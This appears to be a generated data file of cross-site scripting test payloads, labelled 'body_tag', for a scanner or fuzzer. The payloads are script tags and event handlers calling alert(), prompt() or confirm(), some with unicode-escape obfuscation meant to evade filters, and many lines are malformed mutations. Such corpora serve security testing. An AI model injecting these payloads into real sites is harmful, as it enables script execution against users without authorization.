body_tag,onerror=\u0061lert();<object/data=saivs.html src=saivs.js <frameset><frame 
body_tag,"src=""data:text/html,<object <embed/data=saivs.html </iframe>"
body_tag,"type=""image"" <object src=saivs.js data=saivs.html </iframe>"
body_tag,src=x <object src=x data=saivs.html </frameset>
body_tag,<object/data=saivs.html <option \u0061lert();</object>
body_tag,"<body onload=alert();type=""image"" </a><input "
body_tag,<video><source onerror=alert();data=saivs.html </script><a/
body_tag,<script>al\u0065rt();</script><script><script>
body_tag,<script>prompt(1);</script></script></script>
body_tag,<script>prompt(1);</script><video><source/<script>
body_tag,</script>onmouseover=alert();<script>onerror=alert();</script>
body_tag,<script>\u0061lert``;</script><object/<script>
body_tag,<script onerror=al\u0065rt();</script>al\u0065rt``;</script>
body_tag,<object onerror=al\u0065rt(); /><al\u0065rt();
body_tag,<object/onerror=\u0061lert(); />javascript:alert(); 
body_tag,<video><source/onerror=alert();data=saivs.html <script> 
body_tag,<body onload=alert();data=saivs.html </object>javascript:alert();
body_tag,<video><source onerror=alert();src=x <script> 
body_tag,<object javascript:\u0061lert();<script data=saivs.html </a>
body_tag,\u0061lert``;<object/data=saivs.html <frameset><frame/<frameset><frame 
body_tag,al\u0065rt``;<object/data=saivs.html </object><canvas/
body_tag,\u0061lert``;<object/data=saivs.html </select>src=x 
body_tag,"al\u0065rt``;<object data=saivs.html </canvas>src=""data:text/html,"
body_tag,<object onerror=al\u0065rt();prompt(1); </img>
body_tag,<select src=saivs.js \u0061lert();<<object/
body_tag,<object data=saivs.html \u0061lert();'</object>
body_tag,"<object/data=saivs.html onload=alert();""></iframe>"
body_tag,<object data=saivs.html onmouseover=alert(); /><select/
body_tag,<object data=saivs.html onmouseover=alert(); /></select>
body_tag,<object/onerror=\u0061lert();javascript:alert(); /><object/
body_tag,<object onerror=al\u0065rt();onerror=alert(); /></canvas>
body_tag,<object data=javascript:alert();><object/
body_tag,<object/data=saivs.html data=></select>
body_tag,"<object/onerror=javascript:alert();type=""image"" \u0061lert();</canvas>"
body_tag,<object data=saivs.html </canvas>onload=alert();</embed>
body_tag,"<object <input/onerror=\u0061lert();type=""image"" <frameset><frame/"
body_tag,</object><iframe onload=alert();data=saivs.html </frameset>
body_tag,confirm(1);<script <script>\u0061lert``;</script>
body_tag,\u0061lert``;<script/<script>al\u0065rt();</script>
body_tag,</iframe></frameset><script>prompt(1);</script>
body_tag,<script/confirm(1);<script>onerror=\u0061lert();</script>
body_tag,<body/onload=alert();saivs.js </select>#
body_tag,<svg/onload=alert();saivs.js src=saivs.js >
body_tag,<body/onload=alert(); /> /><frameset><frame 
body_tag,<body/onload=alert(); /> /><option/
body_tag,<object onerror=\u0061lert(); />al\u0065rt();<option/
body_tag,<iframe/onload=alert();>onerror=javascript:alert();<script 
body_tag,</object><object/data=saivs.html <video><source <a 
body_tag,<object src=x data=saivs.html javascript:alert();>
body_tag,"""<object onerror=\u0061lert();onmouseover=alert();>"
body_tag, /><object/data=saivs.html <object </embed>
body_tag,"""<object/data=saivs.html <input/</iframe>"
body_tag,<object data=saivs.html <select/javascript:alert();</a>
body_tag,<object data=saivs.html </canvas>data=saivs.html onmouseover=alert();
body_tag,<object/data=saivs.html </embed>onerror=alert();onerror=\u0061lert();
body_tag,<object data=saivs.html </embed>alert();onerror=javascript:alert();
body_tag,<frameset><frame/src=  javascript:alert();saivs.js </object>
body_tag,<object <embed/onerror=\u0061lert();src=x </select>
